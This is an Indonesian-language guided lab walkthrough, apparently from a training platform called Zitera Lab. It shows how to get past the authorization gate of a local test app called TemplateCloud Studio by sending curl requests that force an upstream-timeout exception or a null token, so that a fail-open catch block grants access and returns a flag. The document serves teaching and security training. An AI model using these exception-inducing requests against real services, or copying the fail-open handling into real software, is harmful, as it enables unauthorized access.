# Panduan Praktik Terbimbing: Eksploitasi Fail-Open pada TemplateCloud Studio

Dalam panduan terarah ini, Anda akan mempraktikkan proses pembuktian kegagalan penanganan kondisi luar biasa pada gerbang otorisasi **TemplateCloud Studio (Commercial SaaS Email & PDF Document Generator)** pada `http://127.0.0.1:8020`.

---

### Tahap 1: Pengujian Normal Gerbang Token
1. Buka peramban web dan akses halaman TemplateCloud Studio:
   `http://127.0.0.1:8020/`
2. Perhatikan kartu **Authorization Gate Policy**:
   - Status awal: **Strict Enforcement (Authorized = False)**.
3. Kirimkan permintaan pengujian normal menggunakan token sembarang melalui terminal:
   ```bash
   curl -X POST http://127.0.0.1:8020/api/gate/verify \
     -H "Content-Type: application/json" \
     -d '{"token": "invalid_user_token"}'
   ```
4. **Hasil Normal:** Server mengembalikan respons `{"authorized": false, "message": "Access denied"}`.

---

### Tahap 2: Memicu Kondisi Luar Biasa (Upstream Exception Induction)
1. Analisis kode atau perilaku backend terhadap penanganan exception hulu.
2. Kirimkan payload yang mensimulasikan terjadinya kegagalan timeout pada gerbang upstream:
   ```bash
   curl -X POST http://127.0.0.1:8020/api/gate/verify \
     -H "Content-Type: application/json" \
     -d '{"simulate_exception": "UPSTREAM_TIMEOUT"}'
   ```
3. Atau kirimkan payload bernilai null yang memicu kesalahan parsing:
   ```bash
   curl -X POST http://127.0.0.1:8020/api/gate/verify \
     -H "Content-Type: application/json" \
     -d '{"token": null}'
   ```

---

### Tahap 3: Verifikasi Status Fail-Open & Eksfiltrasi
1. Periksa respons yang dikembalikan oleh server:
   ```json
   {
     "authorized": true,
     "fail_open_state": true,
     "message": "Access granted via fail-open fallback.",
     "flag": "ZITERA{...}"
   }
   ```
2. **Analisis Kritis:** Terjadinya exception menyebabkan handler jatuh ke blok catch yang secara keliru mengesahkan akses (*fail-open bypass*).
3. Salin bukti flag berformat `ZITERA{...}` dan submit ke Zitera Lab desktop untuk menyelesaikan modul ini!
